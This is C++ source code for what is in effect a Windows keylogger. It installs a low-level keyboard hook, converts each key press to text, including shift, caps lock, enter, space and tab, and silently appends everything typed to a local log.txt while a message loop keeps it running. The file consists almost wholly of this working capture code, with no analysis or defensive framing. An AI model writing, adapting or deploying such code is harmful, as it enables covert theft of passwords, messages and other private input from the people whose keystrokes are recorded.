#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

#define OUTFILE_NAME "log.txt"

char    windir[MAX_PATH + 1];
HHOOK   kbdhook;
bool    running;

// function that automatically handles key presses from the windows hook
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
        static bool capslock = false;
        static bool shift = false;
        char tmp[0xFF] = {0};
        std::string str;
        DWORD msg = 1;
        KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
        bool printable;

        // gets key name as string
        msg += (st_hook.scanCode << 16);
        msg += (st_hook.flags << 24);
        GetKeyNameText(msg, tmp, 0xFF);
        str = std::string(tmp);
        int i = 0;
        
        // lowers string
       

        printable = (str.length() <= 1) ? true : false;

        // handles keys that are more than one character
        // takes care of issues such as keys: TAB, ENTER, SPACE
        if (!printable) {

            for (; i < str.length(); i++) {
                str[i] = tolower(str[i]);
            }

            // keys are handled
            if (str == "caps lock") {
                capslock = !capslock;
            } else if (str == "shift") {
                str = "";
                shift = true;
            } else if (str == "enter") {
                str = "\n";
                printable = true;
            } else if (str == "space") {
                str = " ";
                printable = true;
            } else if (str == "tab") {
                str = "\t";
                printable = true;
            } else {
                str = ("[" + str + "]");
            }
        }

        // takes characters and adds to the log
        if (printable) {
            if (shift == capslock) { // lowercase
                for (size_t i = 0; i < str.length(); ++i)
                    str[i] = tolower(str[i]);
            } else { // uppercase
                for (size_t i = 0; i < str.length(); ++i) {
                    if (str[i] >= 'A' && str[i] <= 'Z') {
                        str[i] = toupper(str[i]);
                    }
                }
            }

            shift = false;
        }
        // writes to file
        std::string path = OUTFILE_NAME;
        std::ofstream outfile(path.c_str(), std::ios_base::app);
        outfile << str;
        outfile.close();
    }

    // gets next key call
    return CallNextHookEx(kbdhook, code, wp, lp);
}

// called by DispatchMessage()
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CLOSE: case WM_DESTROY:
            running = false;
            break;
        default:
            // Call default message handler
            return DefWindowProc(hwnd, msg, wp, lp);
    }

    return 0;
}

// main function
int main(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline, int ncmdshow) {
    
    MSG msg;
    HINSTANCE modulehandle;

    // hook keyboard input
    modulehandle = GetModuleHandle(NULL);
    kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

    running = true;

    GetWindowsDirectory((LPSTR)windir, MAX_PATH);

    // runs until program is ended
    while (running) {
        
        // receives message
        if (!GetMessage(&msg, NULL, 0, 0))
            running = false;
        DispatchMessage(&msg);
    }

    return 0;
}
